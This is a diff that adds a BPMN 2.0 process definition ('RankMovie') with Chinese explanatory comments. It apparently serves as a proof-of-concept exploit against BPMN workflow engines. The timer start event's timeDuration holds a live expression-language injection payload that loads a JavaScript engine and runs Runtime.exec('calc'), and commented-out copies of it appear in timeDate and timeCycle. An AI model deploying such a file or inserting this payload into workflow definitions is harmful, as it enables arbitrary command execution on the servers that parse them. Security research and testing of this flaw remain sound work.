@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- definitions 这是整个BPMN模型的根元素，所有其他元素都嵌套在其中。 -->
+<bpmn2:definitions
+        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns:bpmn2="http://www.omg.org/spec/BPMN/20100524/MODEL"
+        xmlns:bpmndi="http://www.omg.org/spec/BPMN/20100524/DI"
+        xmlns:dc="http://www.omg.org/spec/DD/20100524/DC"
+        targetNamespace="http://bpmn.io/schema/bpmn"
+        id="sample-diagram"> <!-- 属性id:此BPMN模型唯一的标识符。 -->
+    <!-- process 描述了一个执行过程的开始。这个元素包含了表述业务过程的所有元素。 -->
+    <bpmn2:process id="RankMovieId" name="RankMovie" isExecutable="true">
+        <!-- startEvent:过程开始的地方 直译过来，开始事件 -->
+        <bpmn2:startEvent id="StartEvent_1">
+            <!-- timerEventDefinition：定时事件，它表示在特定的时间点，流程会触发该事件。 -->
+            <bpmn2:timerEventDefinition>
+                <!-- timeDuration:  该标签是BPMN2.0模型的一部分，它是计时事件定义的子元素，用于定义一个期限或时间间隔。 -->
+                <!-- 同时该标签中通常包含一个字符串表达式，该表达式表示一个持续时间，它定义在何时激活或完成一个定时事件。 -->
+                <bpmn2:timeDuration>
+                    ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance()
+                    .getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}
+                </bpmn2:timeDuration>
+<!--                <bpmn2:timeDate>-->
+<!--                    ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance()-->
+<!--                    .getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}-->
+<!--                </bpmn2:timeDate>-->
+<!--                <bpmn2:timeCycle>-->
+<!--                    ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance()-->
+<!--                    .getEngineByName("js").eval('function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec(\'calc\')')}-->
+<!--                </bpmn2:timeCycle>-->
+            </bpmn2:timerEventDefinition>
+        </bpmn2:startEvent>
+    </bpmn2:process>
+    <!-- BPMNDiagram\BPMNPlane\BPMNShape\Bounds这些元素属于BPMN Diagram Interchange (bpmndi)标签，
+    用于定义流程图当中的某些可视化元素，如形状位置和大小等。 -->
+    <bpmndi:BPMNDiagram id="BPMNDiagram_1">
+        <bpmndi:BPMNPlane id="BPMNPlane_1" bpmnElement="RankMovieId">
+            <bpmndi:BPMNShape id="_BPMNShape_StartEvent_2" bpmnElement="StartEvent_1">
+                <dc:Bounds x="206" y="143" width="36" height="36" />
+            </bpmndi:BPMNShape>
+        </bpmndi:BPMNPlane>
+    </bpmndi:BPMNDiagram>
+</bpmn2:definitions>
